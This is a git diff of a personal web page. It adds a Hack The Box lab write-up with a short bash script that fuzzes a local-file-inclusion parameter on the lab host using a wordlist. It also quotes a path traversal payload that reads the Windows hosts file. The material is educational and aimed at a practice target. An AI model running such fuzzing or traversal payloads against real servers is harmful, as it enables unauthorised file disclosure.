@@ -25,10 +25,36 @@ Jeff's Page
   <li> cloud </li>
     <a href="cloud-init.html">cloud-init </a> <br>
     <a href="docker.html">docker</a><br>
-    <a href="kubernetes">kubernetes</a><br>
+    <a href="kubernetes.html">kubernetes</a><br>
 </div>
 
-<div id="center"> <h1 id="head"> website enumeration with bash </h1> <a href="https://www.linkedin.com/in/jeffreysamuels22/">LinkedIn</a> | <a href="https://github.com/kippah2">GitHub</a> <p> This page is currently under construction! </p>  </div>
+<div id="center"> <h1 id="head"> website enumeration with bash </h1> <a href="https://www.linkedin.com/in/jeffreysamuels22/">LinkedIn</a> | <a href="https://github.com/kippah2">GitHub</a> <p> 
+Note: The script has been made but, I'm working on a new version to post that will be more accessible. <br> <br>
 
+<pre class="webenum">
+  <code class="language-bash">
+    #!/usr/bin/env bash
+
+URL="unika.htb/index.php?page="
+FILELIST="../dirbuster/Auto_Wordlists/wordlists/file_inclusion_windows.txt"
+
+set -u
+
+while read -r page; do
+    if ! curl -s "$URL$page" | grep -q "<b>Warning</b>"; then
+        echo -e "\x1b[32;1m[ OK ]\x1b[0m $URL$page"
+    else
+        echo -e "\x1b[31;1m[FAIL]\x1b[0m $URL$page"
+    fi
+done < "$FILELIST"
+</code>
+</pre>
+</p> <br>
+
+This BASH script was designed whilest doing a <a href="https://app.hackthebox.com/starting-point">hackthebox.com</a> introductory lab on internal file inclusion and website enumeration. <br> <br>
+
+I got stuck on the website enumeration portion and consulted the lab guide. It said to progress, I needed to find hidden pages on the webserver. The correct link you were  supposed to append was <br> <a> page=../../../../../../../../windows/system32/drivers/etc/hosts</a>. <br> I felt this was not an intuitive conclusion to come to. How would I know how many directories back I needed to traverse to access the system32 directory? <br> <br>
+
+This is when I decided it would make more sense to just have a script for automating this process. I could feed it a wordlist and curl the unchanging part of the url with lines from the wordlist appended to the end. It would then grep the downloaded html file and look for the word "Warning". Then, print out whether or not the url returned one. Urls that did not return a warning would indicate there's something at that address. </p>
 
 </body>
